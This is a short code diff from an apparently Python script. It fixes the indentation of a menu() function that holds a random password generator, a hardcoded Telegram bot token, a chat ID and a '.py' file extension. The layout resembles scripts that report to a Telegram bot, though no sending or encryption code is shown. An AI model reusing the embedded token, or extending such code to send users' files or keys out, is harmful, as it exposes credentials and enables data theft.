@@ -37,7 +37,7 @@ pwd_length = 12
 pwd = ''
 for i in range(pwd_length):
   pwd += ''.join(random.choice(letters))
-	def menu():
+def menu():
     bot_token = '6644443558:AAH9i1vvLli1YXE0cocYdhhCeI0tTRujX50'  # Replace with your actual bot token
     chat_id = '566775944'      # Replace with your actual chat ID
     extension = '.py'
